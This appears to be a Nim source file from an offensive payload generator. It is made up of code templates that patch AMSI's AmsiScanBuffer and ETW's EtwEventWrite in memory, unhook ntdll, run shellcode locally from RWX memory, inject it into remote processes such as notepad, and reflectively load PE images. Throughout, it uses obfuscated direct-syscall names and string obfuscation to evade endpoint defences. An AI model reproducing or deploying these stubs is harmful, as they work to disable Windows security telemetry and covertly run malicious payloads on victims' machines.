import strformat

let WhispersStub * = """


import whispers/syscalls

"""

let WhispersJumpStub * = """


import whispers/syscallsjump

"""

let WhispersAMSIPatchStub * = """


proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    amsi = MyLoadLibraryA(obf("amsi.dll"))
    if (amsi == 0):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    
    var oldProtection: DWORD = 0

    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    var pHandle: HANDLE = MyGetCurrentProcess()
        
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to change memory protections.")
    else:
        echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")

    var 
        bytesWritten: SIZE_T

    var outLength: SIZE_T
    status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)

    if not NT_SUCCESS(status):
        echo obf("[-] Failed to write memory.")
    else:
        echo obf("[+] oqiazasusjk Succeed!")
                
               
    status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[+] OldProtect set back")
        disabled = true
    
    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
"""


let WhispersETWPatchStub * = """

proc Patchntdll(): bool =
    var
        ntdll: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    ntdll = MyLoadLibraryA(obf("ntdll"))
    if (ntdll == 0):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled


    var hProcess: HANDLE
    hProcess = MyGetCurrentProcess()
    var oldProtection: DWORD = 0
    var success: BOOL

    var protectAddress = cs

    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (success != 0):
        echo obf("uashdiasdj failed")
        return disabled
    echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
    var outLength: SIZE_T
    
    success = oqiazasusjk(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("oqiazasusjk failed")
        return disabled
    success =  uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
    if (success != 0):
        echo obf("uashdiasdj failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    

    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
"""

let WhispersUnhookStub * = """

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = MyGetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
  ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
    return false
  ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  var status = 0
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection: DWORD = 0
          var oldProtection2: DWORD = 0
          var bytesWritten: SIZE_T
          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
          status = uashdiasdj(processH, &ds, &pSize, 0x40, &oldProtection)
          if status != 0:
            echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{GetLastError()}."
            return false
          status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
          if status != 0:
            echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{GetLastError()}."
            return false
          status = uashdiasdj(processH, &ds, &pSize, oldProtection, &oldProtection2)
          if status != 0:
            echo obf("[!] uashdiasdj failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
            return false
  status = zuatzuastdiasyy(processH)
  status = zuatzuastdiasyy(ntdllFile)
  status = zuatzuastdiasyy(ntdllMapping)
  discard MyFreeLibrary(ntdllModule)
  return true


when isMainModule:
  var result = ntdllunhook()
  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"

"""

let WhispersLocalInjectStub*  = """
                

proc pwndemWhispersLike[byte](friendlycode: openarray[byte]): void =

    when defined(amd64):

        let tProcess = MyGetCurrentProcessId()
        var pHandle: HANDLE = MyGetCurrentProcess()
        
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)


        status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] Allocated a page of memory with RWX perms")

        var 
            bytesWritten: SIZE_T

        status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] oqiazasusjk - wrote bytes ") & fmt"{bytesWritten}"
                
            
        let f = cast[proc(){.nimcall.}](buffer)
        f()

when isMainModule:
     pwndemWhispersLike(dectext)

"""

let WhispersRemotePatchAMSIStub* = """

proc remoteLoadAmsi(processID: var DWORD): bool =

   
    # C:\windows\system32\amsi.dll
    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", processID

    var status: NTSTATUS
    var success: BOOL
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    
    status = opqiwepoausdasdjl(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] opqiwepoausdasdjl: "), status


    status = oqiahsjynmxkla(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] oqiahsjynmxkla: "), status
    var bytesWritten: SIZE_T


    status = oqiazasusjk(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] oqiazasusjk: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
    status = zuq8aztsdztausdgbh(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)


    status = zuatzuastdiasyy(tHandle)
    status = zuatzuastdiasyy(pHandle)
    if(status == 0):
      return true
    else:
      return false


proc RemotePatchAmsi(hProcss :HANDLE): bool =

    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]


    var disabled: bool = false
   
    var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get amsi.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled

    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = RemoteProc

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[*] Applying Syscall ETW patch")

    var 
        bytesWritten: SIZE_T

    var outLength: SIZE_T
    status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

    if not NT_SUCCESS(status):
        echo obf("[-] Failed to write memory.")
    else:
        echo obf("[+] oqiazasusjk Succeed!")
                
    status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[+] OldProtect set back")
        disabled = true
    return disabled

when isMainModule:
    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchAmsi(hProcams)
    if (success == 0):
        success = remoteLoadAmsi(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchAmsi(hProcams)
    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

"""

let WhispersRemotePatchETWStub* = """

proc remoteLoadNtdll(processID: var DWORD): bool =

    # C:\windows\system32\ntdll.dll
    var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
    char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
    char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
    char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", processID

    var status: NTSTATUS
    var success: BOOL
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    
    status = opqiwepoausdasdjl(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] opqiwepoausdasdjl: "), status


    status = oqiahsjynmxkla(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] oqiahsjynmxkla: "), status
    var bytesWritten: SIZE_T


    status = oqiazasusjk(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] oqiazasusjk: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
    status = zuq8aztsdztausdgbh(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)


    status = zuatzuastdiasyy(tHandle)
    status = zuatzuastdiasyy(pHandle)
    if(status == 0):
      return true
    else:
      return false


proc RemotePatchEtw(hProcess : HANDLE) : bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

    
    var disabled: bool = false
    var RemoteHandle = GetRemoteModuleHandle(hProcess, obf("ntdll.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get ntdll.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("EtwEventWrite"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = RemoteProc

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    status = uashdiasdj(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[*] Applying Syscall ETW patch")

    var 
        bytesWritten: SIZE_T

    var outLength: SIZE_T
    status = oqiazasusjk(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

    if not NT_SUCCESS(status):
        echo obf("[-] Failed to write memory.")
    else:
        echo obf("[+] oqiazasusjk Succeed!")
                

    status = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
    if not NT_SUCCESS(status):
        echo obf("[-] Failed to allocate memory.")
    else:
        echo obf("[+] OldProtect set back")
        disabled = true

    return disabled

when isMainModule:
    var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchEtw(hProcetw)
    if (success == 0):
        success = remoteLoadNtdll(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchEtw(hProcetw)
    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
    
"""

let WhispersNotepadProcIDStub * = """

import osproc

# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
let tProcess = startProcess(obf("notepad.exe"))
tProcess.suspend() # That's handy!
tProcess.close()

echo obf("[*] Target Process: "), tProcess.processID
var remoteProcID = DWORD(tProcess.processID)

"""

let WhispersShellcoderemoteinjectStub_notepad * = """
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = tProcess.processID

"""

let WhispersShellcoderemoteinjectStub * = """
    
    let tProcess2 = MyGetCurrentProcessId()
    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)


    var oldProtection: DWORD = 0


    var status: NTSTATUS
    var success: BOOL

    
    status = opqiwepoausdasdjl(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] opqiwepoausdasdjl: "), status


    status = oqiahsjynmxkla(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] opqiwepoausdasdjl: "), status
    var bytesWritten: SIZE_T


    status = oqiazasusjk(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] oqiazasusjk: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")


    status = zuq8aztsdztausdgbh(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL)


    status = zuatzuastdiasyy(tHandle)
    status = zuatzuastdiasyy(pHandle)

    echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let WhispersShellcoderemoteinjectStub_customprocfirst * = fmt"""

var remoteProcID: DWORD = 0

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo obf("Process ID not found")

var processID: DWORD
var found: bool = false

"""

let WhispersShellcoderemoteinjectStub_customprocID * = """

for m in remoteprocesses:
    if found == true: continue
    echo obf("Checking: ") & $m
    processID = FindPidByName(m)
    if (processID):
        found = true

echo obf("[*] Target Process: "), processID
remoteProcID = processID

"""

let WhispersShellcoderemoteinjectStub_customprocthird * = fmt"""
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

"""

let WhispersPELoadStub * = """

from winim import size_t

proc getNtHdrs*(pe_buffer: ptr BYTE): ptr BYTE =
    if pe_buffer == nil:
      return nil
    var idh: ptr IMAGE_DOS_HEADER = cast[ptr IMAGE_DOS_HEADER](pe_buffer)
    if idh.e_magic != IMAGE_DOS_SIGNATURE:
      return nil
    let kMaxOffset: LONG = 1024
    var pe_offset: LONG = idh.e_lfanew
    if pe_offset > kMaxOffset:
      return nil
    var inh: ptr IMAGE_NT_HEADERS32 = cast[ptr IMAGE_NT_HEADERS32]((
        cast[ptr BYTE](pe_buffer) + pe_offset))
    if inh.Signature != IMAGE_NT_SIGNATURE:
      return nil
    return cast[ptr BYTE](inh)

proc getPeDir*(pe_buffer: PVOID; dir_id: csize_t): ptr IMAGE_DATA_DIRECTORY =
    if dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES:
      return nil
    var nt_headers: ptr BYTE = getNtHdrs(cast[ptr BYTE](pe_buffer))
    if nt_headers == nil:
      return nil
    var peDir: ptr IMAGE_DATA_DIRECTORY = nil
    var nt_header: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](nt_headers)
    peDir = addr((nt_header.OptionalHeader.DataDirectory[dir_id]))
    if peDir.VirtualAddress == 0:
      return nil
    return peDir

type
    BASE_RELOCATION_ENTRY* {.bycopy.} = object
      Offset* {.bitsize: 12.}: WORD
      Type* {.bitsize: 4.}: WORD


const
    RELOC_32BIT_FIELD* = 3

proc applyReloc*(newBase: ULONGLONG; oldBase: ULONGLONG; modulePtr: PVOID;moduleSize: SIZE_T): bool =
    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
        IMAGE_DIRECTORY_ENTRY_BASERELOC)
    if relocDir == nil:
      return false
    var maxSize: csize_t = csize_t(relocDir.Size)
    var relocAddr: csize_t = csize_t(relocDir.VirtualAddress)
    var reloc: ptr IMAGE_BASE_RELOCATION = nil
    var parsedSize: csize_t = 0
    while parsedSize < maxSize:
      reloc = cast[ptr IMAGE_BASE_RELOCATION]((
          size_t(relocAddr) + size_t(parsedSize) + cast[size_t](modulePtr)))
      if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
        break
      var entriesNum: csize_t = csize_t((reloc.SizeOfBlock - sizeof((IMAGE_BASE_RELOCATION)))) div
          csize_t(sizeof((BASE_RELOCATION_ENTRY)))
      var page: csize_t = csize_t(reloc.VirtualAddress)
      var entry: ptr BASE_RELOCATION_ENTRY = cast[ptr BASE_RELOCATION_ENTRY]((
          cast[size_t](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
      var i: csize_t = 0
      while i < entriesNum:
        var offset: csize_t = entry.Offset
        var entryType: csize_t = entry.Type
        var reloc_field: csize_t = page + offset
        if entry == nil or entryType == 0:
          break
        if entryType != RELOC_32BIT_FIELD:
          return false
        if size_t(reloc_field) >= moduleSize:
          return false
        var relocateAddr: ptr csize_t = cast[ptr csize_t]((
            cast[size_t](modulePtr) + size_t(reloc_field)))
        (relocateAddr[]) = ((relocateAddr[]) - csize_t(oldBase) + csize_t(newBase))
        entry = cast[ptr BASE_RELOCATION_ENTRY]((
            cast[size_t](entry) + sizeof((BASE_RELOCATION_ENTRY))))
        inc(i)
      inc(parsedSize, reloc.SizeOfBlock)
    return parsedSize != 0

proc OriginalFirstThunk*(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} = self.union1.OriginalFirstThunk

proc fixIAT*(modulePtr: PVOID): bool =
    var importsDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
        IMAGE_DIRECTORY_ENTRY_IMPORT)
    if importsDir == nil:
      return false
    var maxSize: csize_t = cast[csize_t](importsDir.Size)
    var impAddr: csize_t = cast[csize_t](importsDir.VirtualAddress)
    var lib_desc: ptr IMAGE_IMPORT_DESCRIPTOR
    var parsedSize: csize_t = 0
    while parsedSize < maxSize:
      lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
          impAddr + parsedSize + cast[uint64](modulePtr)))
      
      if (lib_desc.OriginalFirstThunk == 0) and (lib_desc.FirstThunk == 0):
        break
      var libname: LPSTR = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)
      var call_via: csize_t = cast[csize_t](lib_desc.FirstThunk)
      var thunk_addr: csize_t = cast[csize_t](lib_desc.OriginalFirstThunk)
      if thunk_addr == 0:
        thunk_addr = csize_t(lib_desc.FirstThunk)
      var offsetField: csize_t = 0
      var offsetThunk: csize_t = 0
      while true:
        var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](modulePtr) + offsetField + call_via))
        var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](modulePtr) + offsetThunk + thunk_addr))
        var boolvar: bool
        if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
          boolvar = true
        elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
          boolvar = true
        if (boolvar):
          var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
          fieldThunk.u1.Function = ULONGLONG(libaddr)
        if fieldThunk.u1.Function == 0:
          break
        if fieldThunk.u1.Function == orginThunk.u1.Function:
          var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
          var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
          
    
          var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
          
          let asd = byname.Name
          var hmodule: HMODULE = MyLoadLibraryA(libname)
          var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
          
    
          fieldThunk.u1.Function = ULONGLONG(libaddr)
    
        inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
        inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))
      inc(parsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
    return true

proc pwndem(): void =

    let tProcess2 = MyGetCurrentProcessId()
    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    
    var shellcodePtr: ptr = dectext[0].addr

    var pImageBase: ptr BYTE = nil
    var preferAddr: LPVOID = nil
    var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(shellcodePtr))
    if (ntHeader == nil):
      echo obf("[+] File isn't a PE file.")
      quit()

    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(shellcodePtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
    preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
    
    echo $ntHeader.OptionalHeader.SizeOfImage
    
    var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
    var ds: LPVOID


    var status: NTSTATUS = oqiahsjynmxkla(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
    
    echo obf("oqiahsjynmxkla:")
    echo status
    
    
    if (preferAddr == nil and relocDir == nil):
      echo obf("[-] Allocate Image Base At Failure.\n")
      quit()
    
    ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
    
    var bytesWritten: SIZE_T
    status = oqiazasusjk(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
    
    echo obf("oqiazasusjk:")
    echo status
    
    
    var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[size_t](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
    var i: int = 0
    while i < cast[int](ntHeader.FileHeader.NumberOfSections):
      var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
      var source: LPVOID = (shellcodePtr + SectionHeaderArr[i].PointerToRawData)
      status = oqiazasusjk(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
      echo obf("oqiazasusjk for section: "), toString(SectionHeaderArr[i].Name)
      echo status
      inc(i)
    
    var goodrun = fixIAT(preferAddr)
    
    if preferAddr != preferAddr:
      discard applyReloc(cast[ULONGLONG](preferAddr), cast[ULONGLONG](preferAddr), preferAddr,ntHeader.OptionalHeader.SizeOfImage)
    var retAddr: HANDLE = cast[HANDLE](preferAddr) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)

    let f = cast[proc(){.nimcall.}](retAddr)
    f()

#[
    var 
      protectAddress = preferAddr
      op: ULONG
      t: ULONG
    # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
    status =  uashdiasdj(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
    if (status != 0):
        echo obf("uashdiasdj failed")
        echo status
        echo GetLastError()
    else:
        echo obf("[*] OldProtect set back")

]#


when isMainModule:
     pwndem()

"""